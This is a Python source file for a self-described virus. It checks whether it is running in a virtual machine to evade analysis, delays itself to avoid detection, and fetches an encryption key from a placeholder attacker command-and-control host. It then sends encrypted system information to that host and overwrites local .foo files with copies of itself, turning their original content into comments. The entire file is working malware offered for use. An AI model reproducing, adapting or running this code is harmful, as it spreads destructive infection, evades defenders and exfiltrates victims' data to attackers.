#!/usr/bin/env python
import sys
import os
import glob
import tkinter as tk
from tkinter import messagebox
import base64
import random
import time
import json
import requests
import platform
from cryptography.fernet import Fernet

def decode(encoded_string):
    """Decodes an encoded string using base64 for obfuscation purposes."""
    return base64.b64decode(encoded_string).decode("utf-8")

def running_in_vm():
    """Checks if the script is running in a virtual machine."""
    try:
        with open("/sys/class/dmi/id/product_name", 'r') as f:
            if "VMware" in f.read() or "VirtualBox" in f.read():
                return True
    except FileNotFoundError:
        return False

def display_message():
    """Display a popup message to alert the user of infection."""
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Infected", decode("SGFoYSwgeW91IGhhdmUgYmVlbiBpbmZlY3RlZCBieSBWaXJ1c3dhcmUh"))
    root.destroy()

def random_function_generator():
    """Dynamically generates a function with random behavior."""
    actions = [
        "print('Performing action 1')",
        "print('Performing action 2')",
        "print('Performing action 3')"
    ]
    action = random.choice(actions)
    exec(action)

def self_replicate():
    """Function to make the script replicate itself into .foo files with enhanced polymorphism."""
    with open(sys.argv[0], 'r') as virus_file:
        virus_code = virus_file.readlines()

    mutation = random.choice(['# Just a comment\n', '# Another harmless comment\n', '# Dynamic behavior injected\n'])
    virus_code.insert(1, mutation)

    for file in glob.glob("*.foo"):
        with open(file, 'r') as target_file:
            target_code = target_file.readlines()

        if any("## INFECTED BY PYTHON VIRUS ##\n" in line for line in target_code):
            continue

        with open(file, 'w') as target_file:
            target_file.write("## INFECTED BY PYTHON VIRUS ##\n")
            target_file.writelines(["if __name__ == '__main__':\n"] + ["    " + line for line in virus_code])
            target_file.write("\n# Original content starts here\n")
            target_file.writelines("# " + line for line in target_code)

def gather_system_info():
    """Gather system info to exfiltrate."""
    info = {
        'platform': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor()
    }
    return json.dumps(info)

def encrypt_and_send_data(data, key, url):
    """Encrypt data and send it to the C2 server."""
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())
    headers = {'Content-Type': 'application/octet-stream'}
    response = requests.post(url, headers=headers, data=encrypted_data, verify=False, timeout=5)
    print(f"Data sent with response: {response.status_code}")

def get_key(server_url):
    """Request the Fernet key from the C2 server with error handling and a timeout."""
    try:
        response = requests.get(f"{server_url}/get_key", verify=False, timeout=5)
        return response.text.encode()
    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve key: {e}")
        return None

def main():
    server_url = 'https://YOUR_ATTACKER_IP:443'

    if running_in_vm():
        return

    time.sleep(random.randint(5, 30))  # Random delay to avoid detection

    key = get_key(server_url)  # Try to get the Fernet key from the server
    if key:
        info = gather_system_info()
        encrypt_and_send_data(info, key, f"{server_url}/data")  # Encrypt and send data to C2 server if key is received

    display_message()
    random_function_generator()  # Execute a randomly generated function
    self_replicate()  # Continue with file replication regardless of C2 server status

if __name__ == "__main__":
    main()

